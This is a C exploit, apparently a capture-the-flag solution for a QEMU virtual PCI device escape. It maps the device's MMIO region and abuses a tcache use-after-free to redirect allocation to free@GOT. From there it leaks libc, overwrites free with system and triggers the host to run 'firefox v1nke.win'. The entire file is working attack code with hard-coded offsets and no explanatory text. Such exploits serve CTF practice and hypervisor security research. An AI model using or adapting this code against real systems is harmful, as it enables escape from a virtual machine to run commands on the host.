#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>


void *mmap_addr;

void die(char *mesg){
    perror(mesg);
    exit(-1);
}

uint32_t mmio_read(uint32_t addr){
    return *(uint32_t *)((uint8_t *)mmap_addr + addr);
}

void mmio_write(uint32_t addr,uint32_t value){
    *(uint32_t *)((uint8_t *)mmap_addr + addr) = value;
}

void free_(uint32_t idx){
    idx = idx << 16;
    uint32_t addr = 0;
    addr = (1 << 20) + idx;
    mmio_write(addr,0);
}

void edit_(uint32_t idx,uint16_t offset,uint32_t value){
    idx = idx << 16;
    uint32_t addr = 0;
    addr = (2 << 20) + idx;
    addr += offset;
    mmio_write(addr,value);
}

void malloc_(uint32_t idx,uint32_t size){
    idx = idx << 16;
    uint32_t addr = 0;
    addr = idx;
    size = size/8;
    mmio_write(addr,size);
}

uint32_t show_(uint32_t idx,uint16_t offset){
    idx = idx << 16;
    uint32_t addr = 0;
    addr = (1 << 20) + idx;
    addr += offset;
    return mmio_read(addr);
}

int main(){
    
    //in ubuntu1804;tcache UAF

    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR|O_SYNC);
    if(fd == -1){
        die("open error.");
    }

    mmap_addr = mmap(0,0x1000000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(mmap_addr == MAP_FAILED){
        die("mmap error.");
    }

    for(int i=0;i<0x500;i++){
        malloc_(1,0x370);
    }

    //-------UAF change the tcache's fd --> free@got,then leak the real free addr

    malloc_(0,0x370);

    free_(0);

    edit_(0,0,0x11301a0);
    edit_(0,4,0x0000);
    
    malloc_(1,0x370);
    malloc_(1,0x370);

    uint32_t free_addr_1 = show_(1,0);
    uint32_t free_addr_2 = show_(1,4);
    uint64_t free_addr = 0;
    free_addr = ((uint64_t)free_addr_2 << 32) + free_addr_1;
    uint64_t system_addr = free_addr - 0x48510;
    printf("free addr : 0x%lx\n",free_addr);
    printf("system addr : 0x%lx",system_addr);

    //--------change the free addr --> system addr

    edit_(1,0,system_addr & 0xFFFFFFFF);
    edit_(1,4,(system_addr >> 32));

    malloc_(0,0x200);

    char shell[] = "firefox v1nke.win";
    for(int i=0;i<strlen(shell);i++){
        edit_(0,i,shell[i]);
    }

    //--------trigger the system

    free_(0);

    return 0;
}
